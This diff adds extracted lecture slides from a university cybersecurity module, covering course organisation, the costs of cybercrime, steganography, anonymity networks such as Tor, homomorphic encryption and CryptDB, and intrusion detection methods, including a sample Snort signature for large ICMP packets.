@@ -1,0 +1,3905 @@
+
+================================================================================
+LECTURE: COMP232-1-Intro-26
+================================================================================
+
+--- Page 1 ---
+COMP232
+CyberSecurity
+Dr Anish Mukherjee
+School of CS&I
+University of Liverpool
+anish.mukherjee@liverpool.ac.uk
+--- Page 2 ---
+Resources & lectures will be
+available on CANVAS
+Organisation
+2 Hours Lecture Session/week
+1 Hour Lab Session/week
+--- Page 3 ---
+1. To provide students with understanding of the main
+problems in security, confidentiality and privacy in computers
+and in networks, and the reasons for their importance.
+2. To enable students to understand the main approaches
+adopted for their solution and/or mitigation, together with
+the strengths and weaknesses of each of these approaches.
+Aims
+3. To develop knowledge and skills in practical applications of
+available security solutions.
+4. To introduce students to theoretical foundations of
+cybersecurity and attract their attention to the open
+problems requiring further research.
+--- Page 4 ---
+Main:
+• Richard R. Brooks, Introduction to Computer
+and Network Security, Navigating Shades of
+Gray, CRC Press, Taylor and Francis Group, 2014
+Textbooks
+(and later editions). CNS
+Additional:
+• William Stallings , Network Security Essentials:
+Applications and Standards. Prentice Hall, 2000
+(and later editions). NSE
+• A. Menezes, P. van Oorschot, and S. Vanstone,
+Handbook of Applied Cryptography, CRC Press,
+1996. Available online at
+http://www.cacr.math.uwaterloo.ca/hac free for
+personal use;
+--- Page 5 ---
+Assessment
+• Cybersecurity is both conceptual and practical
+• This module is assessed in two complementary ways
+• Two-hour written exam (70%)
+• Focus on understanding and reasoning about cybersecurity
+concepts, algorithms, protocols, and attacks. Marks are
+awarded for clear explanations and sound reasoning. The
+mock exam is representative of the style and level expected.
+• Coursework - short technical reports (30%)
+• The coursework is divided into two assignments (15% each),
+closely linked to the lab sessions. The assignments focus on
+analysing and evaluating security mechanisms in practice,
+interpreting results, and communicating findings clearly.
+Keep up with lectures, actively engage with labs, and start coursework early, there should be no surprises in either component.
+--- Page 6 ---
+• Lab sessions:
+- start at week 2, see your personal timetable
+- Demonstrators are your main point of call
+More • Assignments Deadlines (Canvas will be kept updated):
+1 - 13 MAR 2026 (17:00)
+Information
+2 - 1 May 2026 (17:00)
+• Feedback:
+Feedback is most useful when it’s timely
+if something is unclear or not working for you, let me
+know early so it can be fixed during the module.
+--- Page 7 ---
+Cyberspace:
+is an electronic medium used to form a global computer
+network(s) to facilitate online communication
+Cybersecurity:
+What is it?
+Security:
+A condition that results from establishment and
+maintenance of protective measures that ensure a
+state of inviolability from hostile acts or influences
+--- Page 8 ---
+In the modern world there are various ways in which
+hostile act and influences can be exercised.
+Security in
+Cyberspace Many of them are coming via ‘Cyberspace’, where in
+particular, unprecedented amount of data about
+individuals and organizations being collected,
+processed, analysed and possibly misused.
+--- Page 9 ---
+Privacy:
+• Privacy is the ability of a person to control the
+availability of information about and exposure of
+Important themselves. It is related to being able to function
+in society anonymously… (from Wikipedia)
+Concept
+Not the same, but Interlinked with Security, as
+• Availability of private information may itself
+constitute a hostile act
+• Availability of (or acquiring) some information
+may be a precondition for some security attacks
+--- Page 10 ---
+• Computer Science: new opportunities/challenges
+• Mathematics: non-trivial mathematics behind
+many solutions
+• Physics: rise of quantum computation (Shor ‘94)
+and quantum cryptography
+What makes
+• Biology: DNA-analysis based authentication
+it interesting
+• Technology: global networking, cloud computing
+• Economical issues: costly cybersecurity
+• Legal & Political Issues: is it legal to fight back?
+Political influence by interfering with elections, etc
+• Social and moral aspects: shall we trade privacy
+for better security?
+--- Page 11 ---
+1
+2
+Costly
+3
+Cybersecurity
+4
+5
+--- Page 12 ---
+• The average cost of a malware attack on a company
+is $2.6 million. [1] Can be hundreds of millions of $.
+• $3.9 million is the average cost of a data breach. [2]
+Global impact:
+• The financial services industry takes in the highest
+cost from cybercrime at an average of $18.3 million
+per company surveyed. [3]
+• The industry with the highest number of attacks by
+ransomware is the healthcare industry. Attacks
+quadrupled in 2020. [4]
+--- Page 13 ---
+• 82% of employers report a shortage of
+cybersecurity skills. [1]
+Jobs • In 2021, 3.5 million unfilled cybersecurity
+jobs globally. [2]
+• Since 2016, the demand for Data Protection
+Officers (DPOs) has skyrocketed and risen
+over 700%, due to the GDPR demands. [3]
+--- Page 14 ---
+• Sell your data to other hackers
+• One way hackers profit from stolen data is selling it in
+masses to other criminals on the dark web. These collections
+can include millions of records of stolen data. The buyers can
+then use this data for their own criminal purposes.
+What can
+hackers do • Identity theft
+• using the victim’s credit card or taking loans in their name.
+with my
+• used to target phishing attacks and extortion
+information?
+• With stolen personal information criminals can target victims
+with phishing attacks. In phishing scams victims are lured
+into giving information like credit card details willingly to
+criminals by masking the scam as something legit. If
+criminals get access to very sensitive information, they can
+also extort the victim.
+--- Page 16 ---
+Avg. Avg.
+Avg. Price
+Credit Card Details Price Price YoY
+USD (2021) Product
+USD USD Diff
+(2020) (2021)
+Hacked (Global) credit card details with
+$35
+CVV
+Cloned Mastercard with PIN $15 $25 +$10
+Cloned American Express with PIN $35 $35 $0
+USA hacked credit card details with CVV $17
+Cloned VISA with PIN $25 $25 $0
+UK hacked credit card details with CVV $20
+Credit card details, account balance up
+$12 $15 +$3
+to $1,000
+Canada hacked credit card details with
+$28
+CVV
+Credit card details, account balance up
+$20 $24 +$4
+to $5,000
+Australia hacked credit card details with
+$30
+CVV
+Stolen online banking logins, minimum
+$35 $40 +$5
+$100 on account
+Israel hacked credit card details with CVV $65
+Stolen online banking logins, minimum
+$65 $120 +$55
+$2,000 on account
+Spain hacked credit card details with CVV $40
+Walmart account with credit card
+$10 $14 +$4
+attached
+Japan hacked credit card details with CVV $40
+--- Page 17 ---
+• Stuxnet
+• Computer worm discovered in June 2010
+Computer
+• It targets Siemens industrial software and equipment
+running on Microsoft Windows
+security in
+• 60% of the infected computers were in Iran (August
+Industrial 2010) including controllers handling the centrifuges at
+Natanz nuclear facilities
+software • Was it a field test of a cyber weapon?
+• Also, hacking Cars (2015), Medical equipments etc.
+--- Page 18 ---
+• SolarWinds is a company that produces an
+extremely popular network management system –
+Credential management.
+• Software based – manages all of the credentials on
+the network. Specializes in managing them for large
+organizations and enterprises
+SolarWinds
+• They gained access to victims via trojanized updates
+to SolarWind's Orion IT monitoring and
+management system.
+• 'SolarWinds.Orion.Core.BusinessLayer.dll' is a
+SolarWinds digitally signed component of the Orion
+software framework that contains a backdoor that
+communicates via HTTP to third-party servers.
+• Initial infection started in 2019 with a dormant ‘do
+nothink’ commit to the main source code repository
+--- Page 19 ---
+✓Security and Privacy Overview
+• security attributes, authentication and authorization, access
+permission, social engineering, vulnerabilities and attacks.
+• Passwords v. tokens v. biometrics, Multifactor authentication
+✓Cryptography
+Content of the
+• symmetric encryption, public key encryption, hash functions,
+key exchange protocols, message confidentiality.
+course
+• steganography, homomorphic encryption
+• quantum cryptography and computation
+• zero-knowledge proofs, secure multiparty computations
+✓ Security protocols
+• key exchange, man-in-the-middle attack, formal methods for
+protocol analysis, model checking
+--- Page 20 ---
+✓Securing Networks:
+• firewalls, intrusion detection and prevention systems.
+✓Data Aggregation, Privacy, and Anonymity
+• Mix-networks, Crowds, Tor-network
+Content
+✓Attacks and defences:
+• SQL Injection, SSH insertion, Malwares, Anti-virus methods
+✓legal and ethical issues related to security and privacy
+✓Applications of cryptographic algorithms
+--- Page 21 ---
+[CNS]:
+Chapter 1
+Reading
+[NSE]:
+Chapter 1, sections 1.1 –1.3
+
+================================================================================
+LECTURE: COMP232-10-Steganography-26
+================================================================================
+
+--- Page 1 ---
+STEGANOGRAPHY
+--- Page 2 ---
+WHAT TO PROTECT
+Table by I. A. Goldberg
+Metadata of message here is: the sender, the recipient, the time
+the message was sent, or the length of the message, etc
+--- Page 3 ---
+STEGANOGRAPHY AND INFORMATION HIDING
+Steganography, derived from “covered writing” in Greek
+It includes the methods of secure communications that conceal
+the very existence of the message
+Examples (non-digital): invisible ink, microdots, printer steg., etc
+--- Page 4 ---
+STEGANOGRAPHY IN
+DIGITAL WORLD
+--- Page 5 ---
+DIGITAL WATERMARKING
+• Aim is to embed an amount of information that could not be removed or
+altered without making the cover object entirely unusable
+• Adds additional requirement of robustness as compared with steganography
+• Can be used for copyright protection
+--- Page 6 ---
+Apparently neutral's protest is thoroughly discounted
+TEXTS AS COVER and ignored. Isman hard hit. Blockade issue affects
+pretext for embargo on by products, ejecting suets
+OBJECTS
+and vegetable oils.
+(Real example of the text sent by a spy in WWII)
+--- Page 7 ---
+TEXTS AS COVER OBJECTS
+Apparently neutral's protest is thoroughly discounted
+and ignored. Isman hard hit. Blockade issue affects
+pretext for embargo on by products, ejecting suets
+and vegetable oils
+Taking the second letter in each word gives the message:
+Pershing sails from NY June 1
+--- Page 8 ---
+IMAGES AS COVER OBJECTS
+LSB (Least Significant Bit) substitution method:
+• Least significant bits used to store characteristics of particular pixels of an
+image (cover object) are modified to store a message
+• Consider RGB 24-bit bitmap format
+• Colours and brightness of pixels of obtained image may differ slightly
+from original cover image, but both images looks identically to human eye
+• Easy to implement, but not too robust methods
+• Transformations of images may easily destroy the message (watermark)
+--- Page 9 ---
+IMAGES AS COVER OBJECTS
+Watermarked image (LSB substitution) Watermark recovered
+Note: watermark is embedded as the image, not the plain text to improve robustness
+--- Page 10 ---
+Advantages of LSB
+ADVANTAGES
+easy to implement
+AND has high capacity
+DISADVANTAGES
+Disadvantages of LSB
+OF LSB
+is not robust
+message is easy to detect:
+A message insertion introduces distortion to the
+statistical properties of image which never naturally appear
+--- Page 11 ---
+Simple variant:
+• Before embedding a message, randomly chosen pixels are
+altered by changing their intensities (= a number between 0
+STOCHASTIC
+and 255) by +1 or –1
+MODULATION • For a parameter 𝑝 ∈ [0,1] a pixel intensity is increased/
+decreased by 1 with probability 𝑝; it is left unchanged with
+METHOD probability 1 − 2𝑝
+• Then LSB method is used
+Provide more protection against detection of the message.
+--- Page 12 ---
+STOCHASTIC MODULATION METHOD
+Improved method (J. Fridrich, M. Goljan):
+The idea:
+• take a cover image and add a “noise” modulated by a message bits
+• “noise” actually means pseudo-noise here, that is a sequence of
+pseudo-random values, which can be generated deterministically
+given a secret initial value (key)
+• If initial value (key) is known, then generation of pseudo-noise can
+be repeated (used for extraction of the message)
+--- Page 13 ---
+STOCHASTIC MODULATION
+• Simple implementation
+• High capacity
+• Low embedding and extraction complexity
+• Embedding noise can have arbitrary characteristics and may
+approximate the noise of a given device => high security
+--- Page 14 ---
+TRANSFORM SPACE ALGORITHMS
+• Jsteg algorithm (D. Upham) uses specifics of JPEG image format
+• For each colour component JPEG image format uses discrete cosine transform (DCT)
+• DCT is used by JPEG to transform 8 by 8-pixel blocks of the image to 64 DCT coefficients each:
+7 7
+1 2𝑥 + 1 𝑢𝜋 2𝑦 + 1 𝑣𝜋
+𝐹 𝑢, 𝑣 = 𝐶 𝑢 𝐶 𝑣 ෍ ෍ 𝑓 𝑥, 𝑦 ∗ cos cos
+4 16 16
+𝑥=0 𝑦=0
+1
+where 𝐶(𝑥) = if 𝑥 = 0 and 𝐶(𝑥) = 1, otherwise.
+2
+--- Page 15 ---
+TRANSFORM SPACE ALGORITHMS
+• JPEG: after quantization DCT coefficients are stored
+• Jsteg algorithm:
+ Replace sequentially the least-significant bit of discrete cosine transform
+(mid frequency) coefficients with the message data
+• Gives better protection (as many others TS algorithms) against
+visual attacks
+--- Page 16 ---
+AUDIO (VIDEO) FILES AS COVER OBJECTS
+• Temporal object. LSB can be used, but it introduces a significant noise to audio data
+• A message may be encoded in audio signal phase, replacing original phase with a reference
+phase representing a hidden message; more difficult to implement
+• Spread spectrum method: encoded data spread across the maximum range of frequencies;
+difficult to detect hidden message
+• Video objects (files, streams) can be used for hiding information as well
+--- Page 17 ---
+• Steganography within TCP/IP:
+NETWORK
+ Insert data within TCP and IP protocol headers
+ IP identifier, TCP initial sequence number, least significant bit of TCP
+PACKETS AS
+timestamp, IP flags
+ Relatively easy to detect naive embedding by anomaly detection in
+COVER OBJECTS
+TCP/IP fields
+• One can prevent easy detection by taking into account the
+properties of concrete implementations of TCP/IP (Murdoch,
+Lewis, 2005)
+• HTML steganography (PhD project 2015 – 2018)
+--- Page 18 ---
+REDUNDANCY
+Steganography is applicable to any data objects that contain redundancy
+Redundancy is used to hide the presence of the embedded message
+On the other hand, redundancy may be removed during data compression
+One may combine data compression and message embedding:
+MP3stego by F. Petitcolas
+
+================================================================================
+LECTURE: COMP232-11 Anonymity-26
+================================================================================
+
+--- Page 1 ---
+Data Aggregation, Privacy
+Threats and Anonymity
+WSPC, Chapter 8
+--- Page 2 ---
+The technologies of the Internet and the Web was designed
+to transfer information, not protect the privacy or security
+of people who use this information;
+Privacy
+Moreover, existing technologies provide with opportunities
+to collect a lot of information about users of computer
+concerns
+networks
+Example: a web site may collect information about people
+seeing their messages:
+- Where they live; what other web sites the person has
+visited; their email addresses; etc
+--- Page 3 ---
+Information privacy
+• Alan Westin (1967), Information privacy:
+• “the claim of individuals, groups, or institutions to
+determine for themselves when, how, and to what
+extent information about them is communicated to
+others.”
+• Information privacy threat: many individuals and
+institutions have lost ability to control how and to what
+extent information about them is communicated to
+marketing companies, government agencies, etc
+--- Page 4 ---
+Personal and Private
+Information
+• Personal information. Information about a person, like
+a name, date of birth, names of parents, attended
+schools, etc
+• Private information. Personal information that is not
+generally known. Some kinds of private information, for
+example bank records are protected by law.
+• GDPR (implemented 2018). Unless a data subject has
+provided informed consent to data processing for one
+or more purposes, personal data may not be processed
+unless there is at least one legal basis to do so.
+--- Page 5 ---
+Personally
+Personally identifiable information. Information
+identifiable
+from which a person identity can be derived.
+Example: an account number.
+and
+Anonymized information. Information from which a
+Anonymized
+person identity cannot be derived. Example: an age
+of person (if no other information is available)
+information
+--- Page 6 ---
+Aggregate
+information
+• Statistical information combined from
+many individuals to form a single record.
+Example: National Census Bureau.
+• No person identity can be extracted from
+aggregate information alone, but when
+combined with other anonymized
+information, aggregate information can
+help to identify and reveal particular
+characteristics of an individual.
+--- Page 7 ---
+Combining seemingly anonymous information
+one may reveal identity with high probability:
+If you ask a person for
+Privacy threats
+• a birthday
+• postcode
+based on
+• an age
+anonymized
+You ask for personally identifiable information,
+even though it look anonymized.
+information
+Online examples:
+• Screen resolution
+• Battery % remaining / power available
+• Operating system
+• Browser & version
+--- Page 8 ---
+Open-Source Intelligence Gathering (OSINT)
+• The collection and analysis of information that is gathered from public, or open, sources.
+• Information can also be considered open source if it is:
+• Published or broadcast for a public audience (for example, news media content)
+• Available to the public by request (for example, census data)
+• Available to the public by subscription or purchase (for example, industry journals)
+• Could be seen or heard by any casual observer
+• Made available at a meeting open to the public
+• Obtained by visiting any place or attending any event that is open to the public
+--- Page 9 ---
+• Title of the article in the New Your Times, by Tom
+Zeller, Jr, published May 18, 2005
+• It analyses the project at John Hopkins University,
+“Personal
+done by Prof. Aviel D. Rubin and his students
+Data for the
+• Several groups of three to four students set out to
+collect personal information on citizens of
+Baltimore using only legal, public sources of
+Taking”
+information, such as death records, property tax,
+campaign donations, occupational registries, etc
+• Each group could spend no more that $50
+• Altogether they gathered over a million records
+with hundreds of thousands of individuals
+--- Page 10 ---
+• Databases they collected were cleaned and linked,
+making it possible to query a multiple layers of
+information about a single name
+“Personal
+• Typical result about an individual:
+Data for the
+• Name
+Taking”(cont • Precise address
+• Occupation (with the details professional license)
+) • The name of their spouse
+• Their birth dates
+• The price of the home they paid
+• The party registration
+• Elections he has voted in last 25 years
+--- Page 11 ---
+Lessons:
+A lot of personal information easily available on the Web
+“Personal
+Data for the
+When consolidated it may violate privacy of individuals
+and be used e.g. for stealing identity
+Taking”(cont.)
+Competing social interests in openness and privacy
+No ready solution
+--- Page 12 ---
+Sources of personal and
+private information
+• User-provided information
+• When using online services or making purchases online,
+users provide personal information such as their names,
+addresses, passwords (including additional security
+passwords), dates of birth, and other sensitive details.
+• Information obtained through the observation of user
+activities or from the digital traces they leave behind.
+• Log Files: Web logs, Mail Logs, DNS logs etc
+• Cookies
+• Web Bugs, Adware, Spyware
+--- Page 13 ---
+Anonymity in
+communications
+• One of the ways to protect privacy is to make a
+communication anonymous, so an adversary that
+can monitor and/or compromise certain parts of the
+systems would not be able to match a message
+sender with the recipient (sender-recipient matching)
+• Most widespread methods for anonymity in the Web
+communications based on the idea of third trusted
+party serving as anonymizer (special proxy server)
+--- Page 14 ---
+Anonymizer
+• Early example: Anonymizer.com (many such available now)
+• Upon a request from a user anonymizer fetches the web
+page and displays is within your browser
+• In doing so, anonymizer does not leave information about
+your request on the web-server: it re-directs your request,
+replacing all sensitive information (IP address, etc) with its
+own details
+• Additionally, it may provide
+• encryption of traffic between a user and itself
+• Blocking and removing potential active privacy and
+security threats: web bugs, spyware, viruses, etc
+--- Page 15 ---
+Good protection and reasonable cost
+Anonymizer
+Privacy protection is based on the trusted
+central proxy
+Central proxy “knows everything” about
+communication – attacks by “insiders” are
+possible
+--- Page 16 ---
+Mix-
+Networks
+• Proposed by D. Chaum (1981)
+• A mix node is a node in the network that takes a number of
+incoming messages (packets), modifies them and output in a
+random order.
+• The mix nodes can be used for anonymous communication.
+--- Page 17 ---
+Mix-Networks
+It operates as follows:
+• The message is sent through a sequence of mix nodes (a
+route) 𝑝 , 𝑝 , 𝑝 , …,𝑝 . The user encrypts the message with
+1 2 3 𝑑
+node 𝑝 key, the result encrypt with the node 𝑝 key, etc.
+𝑑 𝑑−1
+• Every mix node receives several messages, decrypt them, re-
+order and send to the next nodes in the route
+• Every nodes “knows” only previous and the next node in the
+route => compromising a single, or even several (not all) mix
+nodes does not give an attacker an information about
+sender-receiver matching
+• More expensive than anonymizer solution but gives
+more privacy protection.
+Pic taken from Wikipedia
+--- Page 18 ---
+• M. Reiter, A. Rubin, 1998, Crowds: Anonymity for Web
+Transactions
+Anonymity, • Based on the idea “blending into a crowd”, that is
+hiding one’s actions within the actions of many others
+further
+• To execute a web transaction a user first joins a
+“crowd” of other users
+approaches
+• Then the user’s request to a web server is passed to
+a random member of the crowd
+• That member can either submit the request to the
+server or forward it to another randomly chosen
+member of the crowd and so on
+--- Page 19 ---
+Crowds
+Paths in a crowd. Picture
+by M.Reiter and A. Rubin
+--- Page 20 ---
+Privacy protection
+by the crowd
+When the request submitted to
+the end server, it is submitted by
+a random member of a crowd, so
+identity of an initiator is hidden
+(“in the crowd”) from an external
+observer
+Members of the crowd cannot
+identify initiator as well, they
+“just passing requests”
+--- Page 21 ---
+Unlike an anonymizer crowds provide no single
+point, where an attacker can compromise
+anonymity of all users
+Crowds vs
+Crowds does not provide anonymity against a global
+anonymizers adversary able to oversee all communications. In
+contrast, mix networks protect anonymity in that
+case.
+and mixes
+Crowds admit very efficient implementations in
+comparison with mixes: no encryption/ decryption
+operations, no inflation of message lengths.
+--- Page 22 ---
+Tor: anonymity online
+Tor (from The onion routing project, originated in the US Naval Research
+Lab) – practical solution for anonymity protection : www.torproject.org
+It is free and open source and available for major platforms: Windows, Mac,
+Linux/Unix, Android
+Can be used for web browsing and instant messaging, prevents people from
+learning your location or browsing habits
+--- Page 23 ---
+Tor: main principles
+A combination of (variants of) mix-network and crowd
+mechanisms
+• Using a set of relay nodes (crowd); currently >7000
+• Routing using random choice (similar to crowds)
+• Encrypted connections between neighbouring nodes
+(similar to mix-networks)
+• It uses public key cryptography to share the secret
+keys between neighbouring nodes => uses the shared
+secret to perform symmetric encryption in further
+communications between neighbours
+• temporarily available two-way virtual channels
+--- Page 24 ---
+Tor-Networks
+• Traffic routed via encrypted nodes. Each
+node decrypts one layer of encryption
+• Entry point is only known by the first
+link, and exit point is only known by the
+last link
+• Nodes are only aware of the next link.
+
+================================================================================
+LECTURE: COMP232-12-HomomorphicEnc-26
+================================================================================
+
+--- Page 1 ---
+COMPUTING OVER
+ENCRYPTED DATA:
+HOMOMORPHIC
+ENCRYPTION AND CRYPTDB
+--- Page 2 ---
+HOMOMORPHIC ENCRYPTION
+Encryption 𝐸𝑛𝑐 is called homomorphic with respect to an
+operation ∗ if 𝐸𝑛𝑐(𝑥 ∗ 𝑦) = 𝐸𝑛𝑐(𝑥) ∗ 𝐸𝑛𝑐(𝑦)
+That is given encrypted forms of 𝑥 and 𝑦, in order to compute encrypted
+form of 𝑥 ∗ 𝑦 one does not need to decrypt 𝐸𝑛𝑐(𝑥) and 𝐸𝑛𝑐(𝑦)
+Computations happen over encrypted values!
+--- Page 3 ---
+PARTIAL VS FULLY
+HOMOMORPHIC SCHEMES
+Partially homomorphic encryption:
+with respect just to one operation (+ or ×)
+RSA (unpadded) is homomorphic with respect to multiplication
+▪𝐸𝑛𝑐 𝑥 = 𝑥𝑒 𝑚𝑜𝑑 𝑛
+▪𝐸𝑛𝑐 𝑥 × 𝐸𝑛𝑐 𝑦 = 𝑥𝑒 × 𝑦𝑒 = 𝑥𝑦 𝑒 = 𝐸𝑛𝑐 𝑥𝑦
+Other schemes: Paillier (can be used in voting), …
+Fully homomorphic schemes [RAD’78]:
+ With respect to multiplication and addition
+ Allow to perform arbitrary computations
+ Existence is by no means obvious
+--- Page 4 ---
+HOW TO COMPUTE ARBITRARY FUNCTIONS
+For us, programs = functions = Boolean circuits with XOR (+ 𝑚𝑜𝑑 2) and AND (× 𝑚𝑜𝑑 2) gates
+𝐸𝑛𝑐((𝑥 + 𝑥 )𝑥 𝑥 )
+1 2 3 4
+X
+𝐸𝑛𝑐(𝑥 𝑥 )
+𝐸𝑛𝑐(𝑥 + 𝑥 ) 3 4
+1 2
+X
+𝐸𝑛𝑐(𝑥 ) 𝐸𝑛𝑐(𝑥 ) 𝐸𝑛𝑐(𝑥 ) 𝐸𝑛𝑐(𝑥 )
+1 2 3 4
+Takeaway: If you can compute XOR and AND on encrypted bits, you can compute any program
+--- Page 5 ---
+BREAKTHROUGH: FHE IS POSSIBLE!
+Craig Gentry: first fully homomorphic encryption scheme is announced by IBM in 2009
+(based on lattice cryptography and introduced bootstrapping to control noise growth)
+The scheme is impractical for many applications:
+▪ Ciphertext size and computation time increase sharply as one increases the security level
+▪ Operations are 1000x to 1,000,000x slower than on plaintext
+ Ciphertexts are huge polynomials (message + noise)
+ Noise grows after every operation
+ Bootstrapping resets noise (very expensive)
+▪ Key’s size is also an issue
+FHE security is based on Learning With Errors (LWE) and this is believed to be quantum-resistant
+--- Page 6 ---
+New more efficient schemes and implementations since
+2010, key size is reduced at least to 600Kb (~2016)
+HELib is an open-source implementation (2013, new
+version 2018) ) (C++)
+RECENT
+More implementations available, including in R and Python
+DEVELOPMENTS
+New library SEAL made available by Microsoft in 2018
+Others: PALISADE, OpenFHE, HEAAN, FHEW, TFHE, LattiGo ...
+All based on lattices and use bootstrapping technique
+Still more work is needed to make it practical
+--- Page 7 ---
+Computations on not entirely trusted
+services (e.g. cloud):
+• Encrypt your computational task and send it to a
+remote server
+• The server computes over encrypted data and
+returns an encrypted result
+POTENTIAL • Decrypt result
+APPLICATIONS Pipeline processing without revealing
+intermediate data
+Examples:
+• Hospitals sharing patient data for medical study
+• Similarly for financial, or other sensitive data
+• Training ML models directly on encrypted data
+--- Page 8 ---
+Similar idea in data processing:
+• To query encrypted SQL database without
+decrypting
+• Selected fields can be encrypted
+• Practical working prototype system: CryptDB
+Raluca Ada Popa et al, MIT (2011- ):
+http://css.csail.mit.edu/cryptdb/
+Low overhead: reducing throughput 15-25%
+Layered classical crypto, practical but limited
+CRYPTDB
+SQL queries
+--- Page 9 ---
+ONION-LAYERED SQL-AWARE
+ENCRYPTION
+All data in CryptDB can be encrypted using several layers of encryption
+ Each layer may “release” some information about encrypted value
+ Queries cause the system to peel encryption layers until the minimum functionality needed is exposed
+ Trade-off: functionality vs information leakage
+--- Page 10 ---
+QUERYING IN CRYPTDB
+Before querying, depending on a query:
+ some values in the query are encrypted
+ encryption layers in the database are adjusted (both steps are done by a proxy)
+After the query execution: encrypted results are returned
+ The proxy decrypts them and returns to the client the final result
+Examples to consider:
+SELECT * FROM Customers
+SELECT * FROM Customers WHERE Country = ‘Mexico’ (SQL tutorial at w3schools.com/sql)
+--- Page 11 ---
+DEVELOPMENTS HERE IN THE
+DEPARTMENT
+In two PhD projects:
+ CryptDB-like approach to graph DBs (Neo4j)
+ CryptDB-like approach do document-based DBs (MongoDB)
+
+================================================================================
+LECTURE: COMP232-13-Monitoring-ID-26
+================================================================================
+
+--- Page 1 ---
+Monitoring
+Intrusion
+Detection
+--- Page 2 ---
+Information
+protection
+--- Page 3 ---
+How to protect
+• We have seen several approaches and techniques for the information protection
+• Techniques were mainly focusing on how to make a security/privacy attack difficult
+• Not all attacks may be prevented
+• How to deal with the attacks anyway?
+--- Page 4 ---
+Defense lines: anti-intrusion methods
+Picture by S. Axelsson
+--- Page 5 ---
+Pre-emption
+Prevention
+Taxonomy of
+Deterrence
+anti-intrusion
+Detection
+methods
+Deflection
+Countermeasures
+--- Page 6 ---
+ Pre-emption: to strike against the threat before it could
+strike against us.
+• Prevention: to preclude, or seriously reduce likelihood of a
+particular attack
+ It may be internal prevention, controlled by the system
+Anti-intrusion
+itself (system owner), or
+ It may be external, taking place in the environment of
+methods
+the system.
+• Deterrence: to persuade an attacker not to launch an attack,
+or to stop ongoing attack. Usually done by increasing the risk
+of negative consequences for the attacker.
+--- Page 7 ---
+Detection: aims to find intrusion attempt and launch
+countermeasures
+Anti-intrusion
+Deflection: to trick away an intruder from where he
+methods
+could do some damage (“honeypot” techniques)
+(cont.)
+Countermeasures: to actively counter an intrusion
+--- Page 8 ---
+• Intrusion detection is the most important of anti-intrusion methods:
+Intrusion
+ Prevention, pre-emption and deterrence are not absolute, and
+attacks happen detection
+ For countermeasures one must detect an attack
+• We consider general principles, structure and functionality of IDSs
+--- Page 9 ---
+Intrusion
+Detection
+System (IDS)
+Picture by S. Axelsson
+--- Page 10 ---
+Audit Collection: collect data for intrusion
+detection, including keyboard input, data from
+various log files, data on network activities
+Elements of
+Audit Storage: stores the data for further
+processing, amount of data may be the problem typical IDS
+Processing: based on collected data, algorithm(s)
+are executed to find an evidence (with some degree
+of certainty) of the suspicious behaviour
+--- Page 11 ---
+Configuration data: specify the way IDS works, how to collect data,
+how to respond to detected attack, etc
+Elements of Reference data: information about known intrusion signatures,
+information about bad/normal behaviour
+typical IDS
+(cont.) Active/Processing data: intermediate results, which should be stored
+during processing
+Alarm
+--- Page 12 ---
+1. Network-based IDS:
+• Monitor network backbones
+• Distributed among different nodes in the network
+• Usually, passive => not easy to detect by an attacker
+• May not be able analyse the traffic in large busy networks
+Types of IDS
+2. Host-based IDS:
+• Operate on hosts
+• Defend and monitor the operating and file systems for
+signs of intrusion
+• Usually monitor activities with higher level of details
+--- Page 13 ---
+Types of IDS (cont.)
+3. Application-based IDS:
+Deal with the events appearing inside of a particular
+application, such as
+▪ Database management systems
+▪Content management
+▪Accounting system
+--- Page 14 ---
+Intrusion detection methods
+Two main categories:
+• Knowledge-based intrusion detection: (policy-based,
+signature based, specification based): system tries to
+match the explicit policies / signatures with the data
+collected to find an evidence of the suspicious behaviour.
+• Anomaly-based intrusion detection: system reacts to
+abnormal behaviour. Behaviour profiles are used, and
+system is able to learn what is “normal” behaviour.
+--- Page 15 ---
+Example of a signature: alert icmp $EXTERNAL_NET any ->
+$HOME_NET any (msg:"MISC large ICMP"; dsize: >800;
+reference:arachnids,246; classtype:bad-unknown; sid:499;)
+Signature
+Alarm will be raised if
+based
+ a ICMP packet originates from the external network,
+method
+ can be associated with any port, and
+ the packet size is more than 800 bytes.
+ A message appears in the IDS alert log.
+ Rest are metadata to track the triggering rule.
+--- Page 16 ---
+Advantages:
+• Very low false alarm rate
+• Simple algorithms, easy implementation
+Signature
+Signature
+based method
+based method
+Disadvantages:
+• Difficulties in updating information on new types of attacks
+• Unable to detect unknown attacks (knowledge based)
+--- Page 17 ---
+Advantages:
+• Possibility of detection of novel attacks as intrusions
+• Less dependence of IDSs on operating environment
+• Ability to detect abuse of user privileges
+Anomaly based
+detection
+Disadvantages:
+• A substantial false alarm rate
+• User behaviours can vary with time, requiring a
+constant update of the normal behaviour profile
+database.
+
+================================================================================
+LECTURE: COMP232-14-TechniquesID-26
+================================================================================
+
+--- Page 1 ---
+Techniques for Intrusion
+Detection
+--- Page 2 ---
+Techniques
+STATISTICAL ANALYSIS NEURAL NETWORKS AND RULE-BASED AND
+MACHINE LEARNING SIGNATURE TECHNIQUES
+used in
+intrusion
+detection
+STATE-TRANSITION IMMUNE SYSTEMS- DATA MINING
+ANALYSIS BASED TECHNIQUES
+--- Page 3 ---
+Statistical analysis
+approach
+• The user or system behaviour (set of attributes) is measured
+by a number of variables over time.
+• Examples of such variables are:
+• user login, logout,
+• number of files accessed in a period of time,
+• usage of disk space, memory, CPU, etc.
+• The frequency of updating can vary from minutes to months
+• The system stores mean values for each variable and detects
+when they exceed a predefined threshold.
+• More sophisticated model: short- and long-term user profiles
+--- Page 4 ---
+Neural Networks and Machine Learning
+• Neural networks use their learning algorithms to learn about the
+relationship between input and output.
+• The main purpose is to learn the behaviour of actors in the system
+(e.g., users, processes).
+• The advantage of using neural networks over statistics:
+• Easy way to express nonlinear relationships between variables
+• Learning about (complex) relationships automatically
+• Disadvantage: NNs are still a computationally intensive technique
+• It has been shown that NNs can be used to predict behaviour of
+users and super-users (roots)
+• Other machine learning techniques may be used
+--- Page 5 ---
+Rule-based (expert) systems: work on a previously
+defined set of rules describing an attack
+All security related events are translated in terms of
+Rule-based
+if-then-else rules
+(expert)
+Systems
+Inference engine maybe used to infer conclusions
+Examples: Wisdom & Sense and ComputerWatch
+(developed at AT&T)
+--- Page 6 ---
+Example of a signature: alert icmp $EXTERNAL_NET any ->
+$HOME_NET any (msg:"MISC large ICMP"; dsize: >800;
+reference:arachnids,246; classtype: bad-unknown; sid:499;)
+Alarm will be raised if a ICMP packet incoming from the external
+Signature network, associated with any port and have size > 800 bytes
+based Advantages:
+• Very low false alarm rate
+method
+• Simple algorithms, easy implementation.
+Disadvantages:
+• Difficulties in updating information on new types of attacks
